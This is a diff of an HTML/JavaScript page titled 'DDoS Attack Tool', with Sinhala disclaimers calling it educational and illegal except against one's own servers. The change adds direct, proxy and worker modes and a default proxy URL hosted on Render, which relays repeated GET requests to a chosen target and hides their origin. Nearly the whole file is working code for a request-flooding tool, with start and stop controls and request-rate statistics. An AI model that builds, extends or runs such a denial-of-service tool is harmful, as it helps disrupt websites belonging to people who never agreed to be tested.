@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>DDoS Attack Tool</title>
+    <title>⚡ DDoS Attack Tool</title>
     <style>
         * {
             margin: 0;
@@ -262,350 +262,458 @@
         .dot.yellow {
             background: #feca57;
         }
+        
+        .mode-selector {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        
+        .mode-btn {
+            flex: 1;
+            padding: 10px;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            background: transparent;
+            color: #aaa;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-size: 14px;
+        }
+        
+        .mode-btn.active {
+            border-color: #ff6b6b;
+            color: #fff;
+            background: rgba(255, 107, 107, 0.1);
+        }
+        
+        .mode-btn:hover {
+            border-color: #ff6b6b;
+        }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h1>⚡ DDoS Attack Tool</h1>
-        <p class="subtitle">⚠️ අධ්‍යාපනික අරමුණු සඳහා පමණයි</p>
+<div class="container">
+    <h1>⚡ DDoS Attack Tool</h1>
+    <p class="subtitle">⚠️ අධ්‍යාපනික අරමුණු සඳහා පමණයි</p>
 
-        <!-- Proxy Status -->
-        <div class="proxy-status" id="proxyStatus">
-            <span class="dot yellow" id="proxyDot"></span>
-            <span id="proxyText">Checking proxy server...</span>
-        </div>
-
-        <!-- Target URL Input -->
-        <div class="input-group">
-            <label>🎯 Target URL</label>
-            <input type="text" id="targetUrl" placeholder="https://your-site.netlify.app" value="https://your-site.netlify.app" />
-        </div>
-
-        <!-- Settings -->
-        <div class="settings">
-            <div class="input-group">
-                <label>⚡ Interval (ms)</label>
-                <input type="number" id="interval" value="500" min="10" max="1000" />
-            </div>
-            <div class="input-group">
-                <label>⏱️ Duration (sec)</label>
-                <input type="number" id="duration" value="30" min="0" placeholder="0 = infinite" />
-            </div>
-        </div>
-
-        <!-- Buttons -->
-        <div class="btn-group">
-            <button id="startBtn" onclick="startAttack()">▶ Start Attack</button>
-            <button id="stopBtn" onclick="stopAttack()">⏹ Stop</button>
-        </div>
-
-        <!-- Status -->
-        <div class="status-box">
-            <div class="stat">
-                <span class="stat-label">📊 Status</span>
-                <span class="stat-value" id="status">Ready</span>
-            </div>
-            <div class="stat">
-                <span class="stat-label">📨 Requests Sent</span>
-                <span class="stat-value danger" id="requestCount">0</span>
-            </div>
-            <div class="stat">
-                <span class="stat-label">✅ Successful</span>
-                <span class="stat-value success" id="successCount">0</span>
-            </div>
-            <div class="stat">
-                <span class="stat-label">❌ Failed</span>
-                <span class="stat-value danger" id="failCount">0</span>
-            </div>
-            <div class="stat">
-                <span class="stat-label">📈 Requests/sec</span>
-                <span class="stat-value" id="rate">0</span>
-            </div>
-        </div>
-
-        <!-- Log -->
-        <div id="logContainer">
-            <div class="log-entry">💡 Enter your Netlify URL and click Start</div>
-        </div>
-
-        <div class="warning">
-            ⚠️ මෙය නීති විරෝධී ක්‍රියාවකි! ඔබගේම servers වල පමණක් test කරන්න.
-        </div>
-        <div class="footer">Made for Educational Purposes Only</div>
+    <!-- Proxy Status -->
+    <div class="proxy-status" id="proxyStatus">
+        <span class="dot yellow" id="proxyDot"></span>
+        <span id="proxyText">Checking proxy server...</span>
     </div>
 
-    <script>
-        // ============================================
-        // 🔧 CONFIGURATION
-        // ============================================
+    <!-- Mode Selector -->
+    <div class="mode-selector">
+        <button class="mode-btn" data-mode="direct" onclick="setMode('direct')">📡 Direct</button>
+        <button class="mode-btn active" data-mode="proxy" onclick="setMode('proxy')">🔄 Proxy</button>
+        <button class="mode-btn" data-mode="worker" onclick="setMode('worker')">🧵 Worker</button>
+    </div>
 
-        // ⭐ මෙය Render deploy උනාට පස්සේ වෙනස් කරන්න
-        const PROXY_URL = 'http://localhost:8080/proxy';
+    <!-- Target URL Input -->
+    <div class="input-group">
+        <label>🎯 Target URL</label>
+        <input type="text" id="targetUrl" placeholder="https://your-site.netlify.app" value="https://your-site.netlify.app" />
+    </div>
 
-        let attackInterval = null;
-        let requestCount = 0;
-        let successCount = 0;
-        let failCount = 0;
-        let isRunning = false;
-        let startTime = null;
-        let isRequesting = false;
-        let rateInterval = null;
-        let rateCounter = 0;
+    <!-- Settings -->
+    <div class="settings">
+        <div class="input-group">
+            <label>⚡ Interval (ms)</label>
+            <input type="number" id="interval" value="600" min="10" max="5000" />
+        </div>
+        <div class="input-group">
+            <label>⏱️ Duration (sec)</label>
+            <input type="number" id="duration" value="120" min="0" placeholder="0 = infinite" />
+        </div>
+    </div>
 
-        // DOM Elements
-        const targetInput = document.getElementById('targetUrl');
-        const intervalInput = document.getElementById('interval');
-        const durationInput = document.getElementById('duration');
-        const statusEl = document.getElementById('status');
-        const requestCountEl = document.getElementById('requestCount');
-        const successCountEl = document.getElementById('successCount');
-        const failCountEl = document.getElementById('failCount');
-        const rateEl = document.getElementById('rate');
-        const logContainer = document.getElementById('logContainer');
-        const startBtn = document.getElementById('startBtn');
-        const proxyDot = document.getElementById('proxyDot');
-        const proxyText = document.getElementById('proxyText');
+    <!-- Proxy Settings -->
+    <div class="input-group" id="proxySettings">
+        <label>🔗 Proxy URL</label>
+        <input type="text" id="proxyUrl" value="https://fixo-dev-ddos-attrack.onrender.com/proxy" placeholder="https://your-proxy.onrender.com/proxy" />
+        <small style="color: #aaa; font-size: 12px;">
+            ⭐ මෙය ඔබගේ Render Proxy URL එකට වෙනස් කරන්න
+        </small>
+    </div>
 
-        // ============================================
-        // 📝 LOG FUNCTION
-        // ============================================
+    <!-- Buttons -->
+    <div class="btn-group">
+        <button id="startBtn" onclick="startAttack()">▶ Start Attack</button>
+        <button id="stopBtn" onclick="stopAttack()">⏹ Stop</button>
+    </div>
 
-        function addLog(message, type = 'info') {
-            const entry = document.createElement('div');
-            entry.className = `log-entry ${type}`;
-            const time = new Date().toLocaleTimeString();
-            entry.textContent = `[${time}] ${message}`;
-            logContainer.appendChild(entry);
-            logContainer.scrollTop = logContainer.scrollHeight;
+    <!-- Status -->
+    <div class="status-box">
+        <div class="stat">
+            <span class="stat-label">📊 Status</span>
+            <span class="stat-value" id="status">Ready</span>
+        </div>
+        <div class="stat">
+            <span class="stat-label">📨 Requests Sent</span>
+            <span class="stat-value danger" id="requestCount">0</span>
+        </div>
+        <div class="stat">
+            <span class="stat-label">✅ Successful</span>
+            <span class="stat-value success" id="successCount">0</span>
+        </div>
+        <div class="stat">
+            <span class="stat-label">❌ Failed</span>
+            <span class="stat-value danger" id="failCount">0</span>
+        </div>
+        <div class="stat">
+            <span class="stat-label">📈 Requests/sec</span>
+            <span class="stat-value" id="rate">0</span>
+        </div>
+        <div class="stat">
+            <span class="stat-label">🔄 Mode</span>
+            <span class="stat-value" id="modeDisplay">Proxy</span>
+        </div>
+    </div>
 
-            while (logContainer.children.length > 100) {
-                logContainer.removeChild(logContainer.firstChild);
-            }
+    <!-- Log -->
+    <div id="logContainer">
+        <div class="log-entry">💡 Enter your Netlify URL and click Start</div>
+    </div>
+
+    <div class="warning">
+        ⚠️ මෙය නීති විරෝධී ක්‍රියාවකි! ඔබගේම servers වල පමණක් test කරන්න.
+    </div>
+    <div class="footer">Made for Educational Purposes Only</div>
+</div>
+
+<script>
+    // ============================================
+    // 🔧 CONFIGURATION
+    // ============================================
+
+    let currentMode = 'proxy';
+    let attackInterval = null;
+    let requestCount = 0;
+    let successCount = 0;
+    let failCount = 0;
+    let isRunning = false;
+    let startTime = null;
+    let isRequesting = false;
+    let rateInterval = null;
+    let rateCounter = 0;
+
+    // DOM Elements
+    const targetInput = document.getElementById('targetUrl');
+    const intervalInput = document.getElementById('interval');
+    const durationInput = document.getElementById('duration');
+    const proxyUrlInput = document.getElementById('proxyUrl');
+    const statusEl = document.getElementById('status');
+    const requestCountEl = document.getElementById('requestCount');
+    const successCountEl = document.getElementById('successCount');
+    const failCountEl = document.getElementById('failCount');
+    const rateEl = document.getElementById('rate');
+    const modeDisplay = document.getElementById('modeDisplay');
+    const logContainer = document.getElementById('logContainer');
+    const startBtn = document.getElementById('startBtn');
+    const proxyDot = document.getElementById('proxyDot');
+    const proxyText = document.getElementById('proxyText');
+
+    // ============================================
+    // 📝 LOG FUNCTION
+    // ============================================
+
+    function addLog(message, type = 'info') {
+        const entry = document.createElement('div');
+        entry.className = `log-entry ${type}`;
+        const time = new Date().toLocaleTimeString();
+        entry.textContent = `[${time}] ${message}`;
+        logContainer.appendChild(entry);
+        logContainer.scrollTop = logContainer.scrollHeight;
+
+        while (logContainer.children.length > 100) {
+            logContainer.removeChild(logContainer.firstChild);
+        }
+    }
+
+    // ============================================
+    // 🔄 MODE SETTER
+    // ============================================
+
+    function setMode(mode) {
+        if (isRunning) {
+            addLog('⚠️ Stop attack first to change mode', 'warning');
+            return;
         }
 
-        // ============================================
-        // 🔍 CHECK PROXY
-        // ============================================
+        currentMode = mode;
+        modeDisplay.textContent = mode.charAt(0).toUpperCase() + mode.slice(1);
 
-        async function checkProxy() {
-            try {
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 3000);
-
-                const response = await fetch(PROXY_URL + '/health', {
-                    method: 'GET',
-                    signal: controller.signal
-                });
-
-                clearTimeout(timeoutId);
-
-                if (response.ok) {
-                    proxyDot.className = 'dot green';
-                    proxyText.textContent = '✅ Proxy server is running';
-                    addLog('✅ Proxy server connected', 'success');
-                } else {
-                    proxyDot.className = 'dot red';
-                    proxyText.textContent = '❌ Proxy server error';
-                }
-            } catch (error) {
-                proxyDot.className = 'dot red';
-                proxyText.textContent = '❌ Proxy server not running (node proxy-server.js)';
-                addLog('⚠️ Proxy server not running. Start with: node proxy-server.js', 'warning');
+        document.querySelectorAll('.mode-btn').forEach(btn => {
+            btn.classList.remove('active');
+            if (btn.dataset.mode === mode) {
+                btn.classList.add('active');
             }
-        }
+        });
 
-        // ============================================
-        // 🎯 SEND REQUEST
-        // ============================================
-
-        function sendRequest(targetUrl) {
-            if (!isRunning) return;
-            if (isRequesting) return;
-
-            isRequesting = true;
-            const startReqTime = Date.now();
-
-            // Use proxy
-            const proxyUrl = PROXY_URL + '?url=' + encodeURIComponent(targetUrl);
-
-            fetch(proxyUrl, {
-                    method: 'GET',
-                    headers: {
-                        'User-Agent': 'Mozilla/5.0 (DDoS-Test-Bot)',
-                        'Accept': '*/*',
-                        'Cache-Control': 'no-cache'
-                    }
-                })
-                .then(response => {
-                    const timeTaken = Date.now() - startReqTime;
-                    requestCount++;
-                    successCount++;
-                    rateCounter++;
-                    updateStats();
-                    addLog(`✅ ${response.status} ${response.statusText} - ${timeTaken}ms`, 'success');
-                    isRequesting = false;
-                })
-                .catch(error => {
-                    const timeTaken = Date.now() - startReqTime;
-                    requestCount++;
-                    failCount++;
-                    rateCounter++;
-                    updateStats();
-                    addLog(`❌ ${error.message || 'Request failed'} - ${timeTaken}ms`, 'error');
-                    isRequesting = false;
-                });
-        }
-
-        // ============================================
-        // 📊 UPDATE STATS
-        // ============================================
-
-        function updateStats() {
-            requestCountEl.textContent = requestCount;
-            successCountEl.textContent = successCount;
-            failCountEl.textContent = failCount;
-
-            if (startTime) {
-                const elapsed = (Date.now() - startTime) / 1000;
-                if (elapsed > 0) {
-                    const rate = Math.round(requestCount / elapsed);
-                    rateEl.textContent = rate;
-                }
-            }
-        }
-
-        // ============================================
-        // ▶️ START ATTACK
-        // ============================================
-
-        function startAttack() {
-            let targetUrl = targetInput.value.trim();
-            const interval = parseInt(intervalInput.value) || 500;
-            const duration = parseInt(durationInput.value) || 30;
-
-            if (!targetUrl) {
-                addLog('❌ Please enter a target URL', 'error');
-                return;
-            }
-
-            if (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://')) {
-                targetUrl = 'https://' + targetUrl;
-                targetInput.value = targetUrl;
-            }
-
-            if (isRunning) {
-                addLog('⚠️ Attack is already running!', 'warning');
-                return;
-            }
-
-            // Check proxy first
+        if (mode === 'proxy') {
+            document.getElementById('proxySettings').style.display = 'block';
+            addLog('🔄 Proxy mode selected', 'info');
             checkProxy();
-
-            isRunning = true;
-            requestCount = 0;
-            successCount = 0;
-            failCount = 0;
-            startTime = Date.now();
-            isRequesting = false;
-
-            startBtn.disabled = true;
-            startBtn.textContent = '⏳ Running...';
-            statusEl.textContent = '🔴 ATTACKING';
-            statusEl.style.color = '#ff6b6b';
-            targetInput.disabled = true;
-            intervalInput.disabled = true;
-            durationInput.disabled = true;
-
-            addLog(`🚀 Attack started on: ${targetUrl}`, 'success');
-            addLog(`⚡ Interval: ${interval}ms, Duration: ${duration === 0 ? 'Infinite' : duration + 's'}`, 'info');
-            addLog(`🔄 Using proxy: ${PROXY_URL}`, 'info');
-
-            // Rate counter
-            rateCounter = 0;
-            if (rateInterval) clearInterval(rateInterval);
-            rateInterval = setInterval(() => {
-                rateCounter = 0;
-            }, 1000);
-
-            // Start sending requests
-            attackInterval = setInterval(() => {
-                if (isRunning) {
-                    sendRequest(targetUrl);
-                }
-            }, interval);
-
-            // Duration timer
-            if (duration > 0) {
-                setTimeout(() => {
-                    stopAttack();
-                    addLog(`⏹️ Attack completed after ${duration} seconds`, 'success');
-                    alert(`✅ Attack completed!\nTotal Requests: ${requestCount}\nSuccessful: ${successCount}\nFailed: ${failCount}`);
-                }, duration * 1000);
+        } else {
+            document.getElementById('proxySettings').style.display = 'none';
+            if (mode === 'direct') {
+                addLog('📡 Direct mode - May be blocked by CORS', 'warning');
+            } else if (mode === 'worker') {
+                addLog('🧵 Worker mode selected', 'info');
             }
         }
 
-        // ============================================
-        // ⏹️ STOP ATTACK
-        // ============================================
+        addLog(`📡 Mode changed to: ${mode}`, 'info');
+    }
 
-        function stopAttack() {
-            if (!isRunning) {
-                addLog('⚠️ No attack is running', 'warning');
+    // ============================================
+    // 🔍 CHECK PROXY
+    // ============================================
+
+    async function checkProxy() {
+        const proxyUrl = proxyUrlInput.value.trim();
+        if (!proxyUrl) {
+            proxyDot.className = 'dot red';
+            proxyText.textContent = 'No proxy URL configured';
+            return;
+        }
+
+        try {
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 5000);
+
+            const response = await fetch(proxyUrl + '/health', {
+                method: 'GET',
+                signal: controller.signal
+            });
+
+            clearTimeout(timeoutId);
+
+            if (response.ok) {
+                proxyDot.className = 'dot green';
+                proxyText.textContent = '✅ Proxy server is running';
+                addLog('✅ Proxy server connected', 'success');
+            } else {
+                proxyDot.className = 'dot red';
+                proxyText.textContent = '❌ Proxy server error';
+            }
+        } catch (error) {
+            proxyDot.className = 'dot red';
+            proxyText.textContent = '❌ Proxy server not running';
+            addLog('⚠️ Proxy server not running. Check your Render URL', 'warning');
+        }
+    }
+
+    // ============================================
+    // 🎯 SEND REQUEST
+    // ============================================
+
+    function sendRequest(targetUrl) {
+        if (!isRunning) return;
+        if (isRequesting) return;
+
+        isRequesting = true;
+        const startReqTime = Date.now();
+
+        let url = targetUrl;
+
+        if (currentMode === 'proxy') {
+            const proxyUrl = proxyUrlInput.value.trim();
+            if (proxyUrl) {
+                url = proxyUrl + '?url=' + encodeURIComponent(targetUrl);
+            } else {
+                addLog('❌ No proxy URL configured', 'error');
+                isRequesting = false;
                 return;
             }
-
-            if (attackInterval) {
-                clearInterval(attackInterval);
-                attackInterval = null;
-            }
-            if (rateInterval) {
-                clearInterval(rateInterval);
-                rateInterval = null;
-            }
-
-            isRunning = false;
-            isRequesting = false;
-
-            startBtn.disabled = false;
-            startBtn.textContent = '▶ Start Attack';
-            statusEl.textContent = '⏹️ Stopped';
-            statusEl.style.color = '#feca57';
-            targetInput.disabled = false;
-            intervalInput.disabled = false;
-            durationInput.disabled = false;
-
-            const elapsed = startTime ? Math.round((Date.now() - startTime) / 1000) : 0;
-            addLog(`🛑 Attack stopped after ${elapsed}s | Total: ${requestCount} requests`, 'info');
-            updateStats();
         }
 
-        // ============================================
-        // 🚀 INIT
-        // ============================================
+        fetch(url, {
+            method: 'GET',
+            headers: {
+                'User-Agent': 'Mozilla/5.0 (DDoS-Test-Bot)',
+                'Accept': '*/*',
+                'Cache-Control': 'no-cache'
+            }
+        })
+        .then(response => {
+            const timeTaken = Date.now() - startReqTime;
+            requestCount++;
+            successCount++;
+            rateCounter++;
+            updateStats();
+            addLog(`✅ ${response.status} ${response.statusText} - ${timeTaken}ms`, 'success');
+            isRequesting = false;
+        })
+        .catch(error => {
+            const timeTaken = Date.now() - startReqTime;
+            requestCount++;
+            failCount++;
+            rateCounter++;
+            updateStats();
+            addLog(`❌ ${error.message || 'Failed to fetch'} - ${timeTaken}ms`, 'error');
+            isRequesting = false;
+        });
+    }
 
-        // Check proxy on load
-        setTimeout(checkProxy, 2000);
+    // ============================================
+    // 📊 UPDATE STATS
+    // ============================================
 
-        // Auto-stop on page close
-        window.addEventListener('beforeunload', function() {
+    function updateStats() {
+        requestCountEl.textContent = requestCount;
+        successCountEl.textContent = successCount;
+        failCountEl.textContent = failCount;
+
+        if (startTime) {
+            const elapsed = (Date.now() - startTime) / 1000;
+            if (elapsed > 0) {
+                const rate = Math.round(requestCount / elapsed);
+                rateEl.textContent = rate;
+            }
+        }
+    }
+
+    // ============================================
+    // ▶️ START ATTACK
+    // ============================================
+
+    function startAttack() {
+        let targetUrl = targetInput.value.trim();
+        const interval = parseInt(intervalInput.value) || 600;
+        const duration = parseInt(durationInput.value) || 120;
+
+        if (!targetUrl) {
+            addLog('❌ Please enter a target URL', 'error');
+            return;
+        }
+
+        if (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://')) {
+            targetUrl = 'https://' + targetUrl;
+            targetInput.value = targetUrl;
+        }
+
+        if (isRunning) {
+            addLog('⚠️ Attack is already running!', 'warning');
+            return;
+        }
+
+        if (currentMode === 'proxy') {
+            const proxyUrl = proxyUrlInput.value.trim();
+            if (!proxyUrl) {
+                addLog('❌ Please enter proxy URL', 'error');
+                return;
+            }
+            // Check proxy
+            checkProxy();
+        }
+
+        isRunning = true;
+        requestCount = 0;
+        successCount = 0;
+        failCount = 0;
+        startTime = Date.now();
+        isRequesting = false;
+
+        startBtn.disabled = true;
+        startBtn.textContent = '⏳ Running...';
+        statusEl.textContent = '🔴 ATTACKING';
+        statusEl.style.color = '#ff6b6b';
+        targetInput.disabled = true;
+        intervalInput.disabled = true;
+        durationInput.disabled = true;
+
+        addLog(`🚀 Attack started on: ${targetUrl}`, 'success');
+        addLog(`⚡ Mode: ${currentMode}, Interval: ${interval}ms, Duration: ${duration === 0 ? 'Infinite' : duration + 's'}`, 'info');
+
+        // Rate counter
+        rateCounter = 0;
+        if (rateInterval) clearInterval(rateInterval);
+        rateInterval = setInterval(() => {
+            rateCounter = 0;
+        }, 1000);
+
+        // Start sending requests
+        attackInterval = setInterval(() => {
             if (isRunning) {
-                if (attackInterval) clearInterval(attackInterval);
-                if (rateInterval) clearInterval(rateInterval);
+                sendRequest(targetUrl);
             }
-        });
+        }, interval);
 
-        // Enter key to start
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter' && !isRunning) {
-                startAttack();
-            }
-        });
+        // Duration timer
+        if (duration > 0) {
+            setTimeout(() => {
+                stopAttack();
+                addLog(`⏹️ Attack completed after ${duration} seconds`, 'success');
+                alert(`✅ Attack completed!\nTotal Requests: ${requestCount}\nSuccessful: ${successCount}\nFailed: ${failCount}`);
+            }, duration * 1000);
+        }
+    }
 
-        addLog('💡 Enter your Netlify URL and click "Start Attack"', 'info');
-        addLog('🔄 Make sure proxy server is running: node proxy-server.js', 'warning');
-        addLog('📌 Default settings are optimized for Netlify', 'info');
-    </script>
+    // ============================================
+    // ⏹️ STOP ATTACK
+    // ============================================
+
+    function stopAttack() {
+        if (!isRunning) {
+            addLog('⚠️ No attack is running', 'warning');
+            return;
+        }
+
+        if (attackInterval) {
+            clearInterval(attackInterval);
+            attackInterval = null;
+        }
+        if (rateInterval) {
+            clearInterval(rateInterval);
+            rateInterval = null;
+        }
+
+        isRunning = false;
+        isRequesting = false;
+
+        startBtn.disabled = false;
+        startBtn.textContent = '▶ Start Attack';
+        statusEl.textContent = '⏹️ Stopped';
+        statusEl.style.color = '#feca57';
+        targetInput.disabled = false;
+        intervalInput.disabled = false;
+        durationInput.disabled = false;
+
+        const elapsed = startTime ? Math.round((Date.now() - startTime) / 1000) : 0;
+        addLog(`🛑 Attack stopped after ${elapsed}s | Total: ${requestCount} requests`, 'info');
+        updateStats();
+    }
+
+    // ============================================
+    // 🚀 INIT
+    // ============================================
+
+    // Check proxy on load
+    setTimeout(checkProxy, 2000);
+
+    // Auto-stop on page close
+    window.addEventListener('beforeunload', function() {
+        if (isRunning) {
+            if (attackInterval) clearInterval(attackInterval);
+            if (rateInterval) clearInterval(rateInterval);
+        }
+    });
+
+    // Enter key to start
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter' && !isRunning) {
+            startAttack();
+        }
+    });
+
+    // Initial log
+    addLog('💡 Enter your Netlify URL and click "Start Attack"', 'info');
+    addLog('🔄 Make sure proxy server is running on Render', 'warning');
+    addLog('📌 Default settings are optimized for Netlify (600ms, 120s)', 'info');
+</script>
 
 </body>
     </html>
